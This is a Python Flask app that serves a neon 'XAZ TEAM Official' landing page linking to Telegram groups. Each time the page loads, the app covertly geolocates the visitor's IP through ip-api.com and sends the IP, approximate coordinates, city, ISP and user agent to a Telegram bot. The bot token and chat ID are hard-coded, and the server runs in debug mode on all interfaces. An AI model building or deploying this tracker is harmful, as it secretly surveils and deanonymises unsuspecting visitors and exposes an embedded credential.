from flask import Flask, render_template_string, request
import requests
import json

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = "7996762402:AAHuUnMT5gZxZhM0pNNoshnd1M3tW4WOyr0"
TELEGRAM_CHAT_ID = "8407554926"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XAZ TEAM Official</title>

    <!-- Meta Tags -->
    <meta name="description" content="Welcome to the XAZ team website. From this site, you will be able to access our official account on the platforms.">
    <meta property="og:title" content="XAZ TEAM Official">
    <meta property="og:description" content="Welcome to the XAZ team website. From this site, you will be able to access our official account on the platforms.">
    <meta property="og:image" content="https://static.vecteezy.com/system/resources/thumbnails/025/463/773/small_2x/hacker-logo-design-a-mysterious-and-dangerous-hacker-illustration-vector.jpg">
    <meta property="og:url" content="https://static.vecteezy.com/system/resources/thumbnails/025/463/773/small_2x/hacker-logo-design-a-mysterious-and-dangerous-hacker-illustration-vector.jpg">
    <meta name="twitter:card" content="summary_large_image">

    <link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        :root {
            --primary-color: #00ffff;
            --secondary-color: #ff00ff;
            --accent-color: #00ff00;
            --dark-bg: rgba(10, 10, 20, 0.85);
            --card-bg: rgba(20, 20, 40, 0.7);
            --text-glow: 0 0 10px currentColor;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: 
                radial-gradient(circle at 20% 30%, rgba(0, 255, 255, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, rgba(255, 0, 255, 0.1) 0%, transparent 50%),
                url('https://i.imgur.com/5rZ91h5.gif');
            background-size: cover, cover, cover;
            background-position: center;
            font-family: 'Space Mono', monospace;
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, rgba(0, 0, 50, 0.7), rgba(50, 0, 50, 0.7));
            z-index: -1;
        }

        .scan-line {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: rgba(0, 255, 255, 0.5);
            box-shadow: 0 0 10px rgba(0, 255, 255, 0.8);
            animation: scan 4s linear infinite;
            z-index: 100;
            pointer-events: none;
        }

        @keyframes scan {
            0% { top: 0%; }
            100% { top: 100%; }
        }

        .wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 30px;
            width: 100%;
            max-width: 800px;
            z-index: 1;
        }

        .header {
            text-align: center;
            padding: 20px;
            background: var(--dark-bg);
            border-radius: 15px;
            border: 1px solid var(--primary-color);
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
            width: 100%;
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(0, 255, 255, 0.1), transparent);
            transform: rotate(45deg);
            animation: shine 6s infinite linear;
        }

        @keyframes shine {
            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
        }

        .header__title {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.8rem;
            font-weight: 900;
            margin-bottom: 10px;
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: var(--text-glow);
            letter-spacing: 2px;
            position: relative;
        }

        .welcome-message {
            font-size: 1.5rem;
            font-weight: bold;
            color: var(--accent-color);
            text-shadow: var(--text-glow);
            margin-top: 10px;
        }

        .button-container {
            display: grid;
            grid-template-columns: 1fr;
            gap: 20px;
            width: 100%;
            max-width: 500px;
        }

        .btn {
            background: var(--card-bg);
            color: white;
            border: 2px solid var(--primary-color);
            padding: 18px 25px;
            font-size: 1.2rem;
            cursor: pointer;
            text-decoration: none;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            transition: all 0.4s ease;
            width: 100%;
            position: relative;
            overflow: hidden;
            font-weight: bold;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }

        .btn:hover::before {
            left: 100%;
        }

        .btn:hover {
            background: var(--primary-color);
            color: #000;
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(0, 255, 255, 0.4);
        }

        .btn i {
            font-size: 1.5rem;
        }

        .team-image {
            margin: 20px 0;
            width: 100%;
            max-width: 350px;
            border-radius: 15px;
            border: 2px solid var(--secondary-color);
            box-shadow: 0 0 25px rgba(255, 0, 255, 0.5);
            transition: transform 0.5s;
        }

        .team-image:hover {
            transform: scale(1.03);
        }

        .special-text {
            font-size: 2.2rem;
            font-weight: bold;
            color: white;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
            margin: 20px 0;
            text-align: center;
            padding: 15px;
            background: var(--dark-bg);
            border-radius: 10px;
            border: 1px solid var(--accent-color);
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.4);
            font-family: 'Orbitron', sans-serif;
        }

        .purple-text {
            font-size: 2rem;
            font-weight: bold;
            color: var(--secondary-color);
            text-shadow: 0 0 15px rgba(255, 0, 255, 0.8);
            margin: 10px 0;
            text-align: center;
            padding: 15px;
            background: var(--dark-bg);
            border-radius: 10px;
            border: 1px solid var(--secondary-color);
            font-family: 'Orbitron', sans-serif;
        }

        .glitch-text {
            position: relative;
            display: inline-block;
        }

        .glitch-text::before,
        .glitch-text::after {
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }

        .glitch-text::before {
            left: 2px;
            text-shadow: -2px 0 var(--primary-color);
            clip: rect(44px, 450px, 56px, 0);
            animation: glitch-anim 5s infinite linear alternate-reverse;
        }

        .glitch-text::after {
            left: -2px;
            text-shadow: -2px 0 var(--secondary-color);
            clip: rect(44px, 450px, 56px, 0);
            animation: glitch-anim2 5s infinite linear alternate-reverse;
        }

        @keyframes glitch-anim {
            0% { clip: rect(31px, 9999px, 15px, 0); }
            5% { clip: rect(42px, 9999px, 36px, 0); }
            10% { clip: rect(18px, 9999px, 47px, 0); }
            15% { clip: rect(2px, 9999px, 25px, 0); }
            20% { clip: rect(8px, 9999px, 32px, 0); }
            25% { clip: rect(45px, 9999px, 3px, 0); }
            30% { clip: rect(21px, 9999px, 19px, 0); }
            35% { clip: rect(37px, 9999px, 41px, 0); }
            40% { clip: rect(14px, 9999px, 29px, 0); }
            45% { clip: rect(5px, 9999px, 11px, 0); }
            50% { clip: rect(28px, 9999px, 50px, 0); }
            55% { clip: rect(33px, 9999px, 22px, 0); }
            60% { clip: rect(9px, 9999px, 38px, 0); }
            65% { clip: rect(26px, 9999px, 7px, 0); }
            70% { clip: rect(48px, 9999px, 16px, 0); }
            75% { clip: rect(12px, 9999px, 44px, 0); }
            80% { clip: rect(39px, 9999px, 27px, 0); }
            85% { clip: rect(23px, 9999px, 6px, 0); }
            90% { clip: rect(17px, 9999px, 34px, 0); }
            95% { clip: rect(4px, 9999px, 13px, 0); }
            100% { clip: rect(30px, 9999px, 46px, 0); }
        }

        @keyframes glitch-anim2 {
            0% { clip: rect(25px, 9999px, 40px, 0); }
            5% { clip: rect(11px, 9999px, 8px, 0); }
            10% { clip: rect(47px, 9999px, 21px, 0); }
            15% { clip: rect(33px, 9999px, 49px, 0); }
            20% { clip: rect(6px, 9999px, 18px, 0); }
            25% { clip: rect(42px, 9999px, 2px, 0); }
            30% { clip: rect(28px, 9999px, 37px, 0); }
            35% { clip: rect(14px, 9999px, 24px, 0); }
            40% { clip: rect(50px, 9999px, 12px, 0); }
            45% { clip: rect(19px, 9999px, 45px, 0); }
            50% { clip: rect(3px, 9999px, 31px, 0); }
            55% { clip: rect(38px, 9999px, 16px, 0); }
            60% { clip: rect(22px, 9999px, 5px, 0); }
            65% { clip: rect(9px, 9999px, 43px, 0); }
            70% { clip: rect(35px, 9999px, 27px, 0); }
            75% { clip: rect(20px, 9999px, 7px, 0); }
            80% { clip: rect(46px, 9999px, 32px, 0); }
            85% { clip: rect(13px, 9999px, 48px, 0); }
            90% { clip: rect(29px, 9999px, 15px, 0); }
            95% { clip: rect(7px, 9999px, 39px, 0); }
            100% { clip: rect(44px, 9999px, 26px, 0); }
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        @media (min-width: 768px) {
            .button-container {
                grid-template-columns: repeat(2, 1fr);
                gap: 20px;
            }

            .header__title {
                font-size: 3.5rem;
            }

            .special-text, .purple-text {
                font-size: 2.5rem;
            }
        }

        @media (max-width: 480px) {
            .header__title {
                font-size: 2rem;
            }
            
            .special-text, .purple-text {
                font-size: 1.5rem;
            }
            
            .btn {
                padding: 15px 20px;
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <div class="scan-line"></div>
    
    <div class="wrapper">
        <header class="header">
            <h1 class="header__title glitch-text" data-text="XAZ TEAM">XAZ TEAM</h1>
            <p class="welcome-message">The Best Web-Customer Team!</p>
        </header>
        
        <main>
            <div class="button-container">
                <a href="https://t.me/+LLvZiuOLhcQ5NmM8" class="btn pulse">
                    <i class="fab fa-telegram"></i> XAZ Team Official Group
                </a>
                <a href="https://t.me/+x3GQ8CZc7oIxOTI0" class="btn">
                    <i class="fab fa-telegram"></i> XAZ New Team
                </a>
            </div>
            
            <img src="https://i.imgur.com/OhoiDOT.png" alt="XAZ TEAM" class="team-image">
            
            <h1 class="special-text">***** XAZ TEAM *****</h1>
            <h1 class="purple-text">WEBSITE %%</h1>
        </main>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const buttons = document.querySelectorAll('.btn');
            
            buttons.forEach(button => {
                button.addEventListener('mouseenter', function() {
                    this.style.animation = 'none';
                });
                
                button.addEventListener('mouseleave', function() {
                    this.style.animation = 'pulse 2s infinite';
                });
            });
            
            const specialText = document.querySelector('.special-text');
            const originalText = specialText.textContent;
            specialText.textContent = '';
            
            let i = 0;
            const typeWriter = () => {
                if (i < originalText.length) {
                    specialText.textContent += originalText.charAt(i);
                    i++;
                    setTimeout(typeWriter, 50);
                }
            };
            
            setTimeout(typeWriter, 1000);
        });
    </script>
</body>
</html>
"""

def get_client_ip():
    if request.environ.get('HTTP_X_FORWARDED_FOR'):
        ip = request.environ['HTTP_X_FORWARDED_FOR'].split(',')[0]
    else:
        ip = request.environ.get('REMOTE_ADDR')
    return ip

def get_ip_info(ip_address):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        data = response.json()
        return data
    except:
        return {"status": "fail", "message": "Unable to get IP info"}

def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload)
        return response.status_code == 200
    except:
        return False

@app.route('/')
def index():
    client_ip = get_client_ip()
    ip_info = get_ip_info(client_ip)
    
    if ip_info.get('status') == 'success':
        message = f"""
🔍 <b>New Visitor Detected</b>

🌐 <b>IP Address:</b> <code>{client_ip}</code>
🏙️ <b>City:</b> {ip_info.get('city', 'N/A')}
🏛️ <b>Region:</b> {ip_info.get('regionName', 'N/A')}
🇺🇸 <b>Country:</b> {ip_info.get('country', 'N/A')}
📍 <b>Location:</b> {ip_info.get('lat', 'N/A')}, {ip_info.get('lon', 'N/A')}
🏢 <b>ISP:</b> {ip_info.get('isp', 'N/A')}
🕒 <b>Timezone:</b> {ip_info.get('timezone', 'N/A')}

📱 <b>User Agent:</b>
{request.headers.get('User-Agent', 'N/A')}
        """
    else:
        message = f"""
🔍 <b>New Visitor Detected</b>

🌐 <b>IP Address:</b> <code>{client_ip}</code>
❌ <b>Unable to get detailed location info</b>

📱 <b>User Agent:</b>
{request.headers.get('User-Agent', 'N/A')}
        """
    
    send_to_telegram(message)
    return render_template_string(HTML_TEMPLATE)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
